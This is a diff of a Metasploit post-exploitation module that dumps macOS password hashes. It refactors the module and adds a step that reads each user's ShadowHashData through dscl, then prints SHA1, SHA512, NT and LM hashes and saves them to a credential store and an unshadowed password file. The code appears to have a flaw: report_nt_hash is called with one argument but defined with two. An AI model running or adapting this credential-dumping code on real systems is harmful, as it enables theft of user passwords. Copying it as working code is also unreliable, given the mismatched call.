@@ -43,40 +43,9 @@ class Metasploit3 < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    print_status("Running module against #{host}")
-    if root?
-      dump_hashes
-    else
-      fail_with("Insufficient Privileges: must be running as root to dump the hashes")
-    end
-  end
+    fail_with("Insufficient Privileges: must be running as root to dump the hashes") unless root?
 
-  # parse the dslocal plist in lion
-  def read_ds_xml_plist(plist_content)
-    doc  = REXML::Document.new(plist_content)
-    keys = []
-    doc.elements.each("plist/dict/key")  { |n| keys << n.text }
-
-    fields = {}
-    i = 0
-    doc.elements.each("plist/dict/array") do |element|
-      data = []
-      fields[keys[i]] = data
-      element.each_element("*") do |thing|
-        data_set = thing.text
-        if data_set
-          data << data_set.gsub("\n\t\t","")
-        else
-          data << data_set
-        end
-      end
-      i+=1
-    end
-    return fields
-  end
-
-  # Dump SHA1/SHA512/SHA512PBKDF2 Hashes used by OSX, must be root to get the Hashes
-  def dump_hashes
+    # build a single hash_file containing all users' hashes
     hash_file = ''
     users.each do |user|
       next if datastore['MATCHUSER'].blank? or datastore['MATCHUSER'] !~ user
@@ -108,6 +77,10 @@ class Metasploit3 < Msf::Post
         print_good "SHA512:#{decoded_hash}"
         hash_file << decoded_hash
       elsif lion? # 10.7
+        shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
+        next unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
+        # strip the other bytes
+        shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
         # on 10.7 the ShadowHashData is stored in plaintext
         hash_decoded = shadow_bytes.upcase
         # Check if NT HASH is present
@@ -143,6 +116,7 @@ class Metasploit3 < Msf::Post
         if nt_hash !~ /000000000000000/
           report_nt_hash(nt_hash)
         end
+
         if lm_hash !~ /0000000000000/
           print_status("LM:#{user}:#{lm_hash}")
           print_status("Credential saved in database.")
@@ -162,6 +136,8 @@ class Metasploit3 < Msf::Post
                         "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
     print_good("Unshadowed Password File: #{upassf}")
   end
+
+  private
 
   # @return [Bool] system version is at least 10.5
   def gte_leopard?
@@ -186,6 +162,31 @@ class Metasploit3 < Msf::Post
     ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
   end
   
+  # parse the dslocal plist in lion
+  def read_ds_xml_plist(plist_content)
+    doc  = REXML::Document.new(plist_content)
+    keys = []
+    doc.elements.each("plist/dict/key")  { |n| keys << n.text }
+
+    fields = {}
+    i = 0
+    doc.elements.each("plist/dict/array") do |element|
+      data = []
+      fields[keys[i]] = data
+      element.each_element("*") do |thing|
+        data_set = thing.text
+        if data_set
+          data << data_set.gsub("\n\t\t","")
+        else
+          data << data_set
+        end
+      end
+      i+=1
+    end
+    return fields
+  end
+
+  # reports the NT hash info to metasploit backend
   def report_nt_hash(nt_hash, user)
     print_status("NT:#{user}:#{nt_hash}")
     print_status("Credential saved in database.")
